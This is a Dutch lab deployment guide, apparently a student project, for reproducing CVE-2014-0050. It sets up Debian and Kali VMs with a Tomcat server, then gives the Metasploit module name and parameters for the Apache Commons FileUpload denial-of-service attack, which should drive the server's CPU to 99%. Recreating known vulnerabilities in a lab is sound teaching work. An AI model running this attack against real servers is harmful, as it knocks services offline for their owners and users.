# User Deployment Guide - CVE 2014-0050

Deze handleiding beschrijft hoe je CVE 2014-0050 kan nabootsen. 

## Inhoudsopgave

-   [Vereisten](#vereisten)
-   [Environement Setup](#environement-setup)
-   [Metasploit Framework](#metasploit)
# Vereisten<a name="vereisten"></a>

Om de Linux machines te installeren en configureren, zijn de volgende vereisten nodig:

-   [Debian](https://sourceforge.net/projects/osboxes/files/v/vb/14-D-b/8.11/81164.7z/download)
-   [Kali](https://sourceforge.net/projects/osboxes/files/v/vb/25-Kl-l-x/2022.3/64bit.7z/download)
# Environement Setup <a name="environement-setup"></a>

- Run het script `vbox-auto.sh` deze zal vragen voor paden van je gedownloade vdi's zie [Vereisten](#vereisten) geef deze in en de 2 linux machines zouden moeten starten.

- Navigeer jezelf naar de aangemaakte `Shared Folder` met de naam `NPE_Shared` deze zou zich moeten bevinden in de home-directory van je host systeem.

- Nu kan je inloggen op de debian vm met `username = osboxes , password = osboxes.org`

- de vdi maakt gebruik van qwerty als je zoals mij met azerty werkt, open dan de terminal na het inloggen en geef de volgende commando in `setxkbmap be`

- Nu omdat we met een oude versie van debian` (8.11 Jessie)` werken zijn er enkele problemen waardoor we de guest-additions niet kunnen installeren voor toegang te krijgen tot de Shared Folder, deze moeten we eerst oplossen.

- Ten eerste kloppen de repo's van de vm niet meer aangezien ` (8.11 Jessie)` end of life is, worden die repo's in archive gestoken. Daarom moeten we naar de `/etc/apt/sources.list` en deze aanpassen.

- Voeg de volgene repo's toe aan de `sources.list`
- `deb http://archive.debian.org/debian/ jessie main non-free contrib`
- `deb-src http://archive.debian.org/debian/ jessie main non-free contrib`

- In de zelfde file zet een `#` voor alles met `deb cdrom` om cdrom problemen te vermijden.

- Voor nu een `apt-get update` uit om de repo's te updaten

- De volgende stap is de juiste kernel-headers installeren die nodig zijn om guest-additions te installeren.

- Doe een `apt search linux-headers`

- Nu kan je de nodige linux-headers zien, installeer met `apt-get install linux-headers-3.16.0-6-all` de headers.

- Hierna is je vm klaar om guest additions te installeren, doe dit met `apt-get install virtualbox-guest-utils`

- Om guest additions te doen werken moet je een reboot van het systeem doen.

- Na de reboot kan je in `/media/` je shared folder terugvinden.

- Voer hier het script `apache-tomcat-install.sh` uit, deze zal de tomcat server opstellen.

- Nu heb je een werkende `apache-tomcat server`



# Metasploit Framework <a name="metasploit"></a>

Metasploit is verantwoordelijk voor de exploit te kunnen uitvoeren.

Begin aan deze stap na het configureren van de debian server.

- Open `metasploit framework` in de zoekbalk.
- Eens je in de msf console zit moet je de exploit kiezen met `use auxiliary/dos/http/apache_commons_fileupload_dos`

- `apache_commons_fileupload_dos` heeft veel verschillende parameters maar om het simpel te houden gaan we enkel gebruik maken van de parameters die nodig zijn om de exploit te runnen.
 ## Parameters
- set rhosts `<rhost>` -> `<rhost>` moet het ip zijn van de target bv. `192.168.76.105`

- set targeturi `<uri>` -> `<uri>` moet de url zijn van de target bv. `/` maar in ons geval is dit de web-applicatie die we hebben gedeployed op de debian server `/sample-multipart-form/multipartForm`

- set rport `<rport>` -> `<rport>` dit is de port waar de tomcat server op draait, dit is standaard `8080` en rport staat ook standaard op `8080` dus deze parameter is eerder optioneel als je tomcat op een andere port draait.


Nu kan je de exploit runnen met het commando `run`

Op de debian server zou Tomcat 99% of meer van de CPU moeten benutten:)


















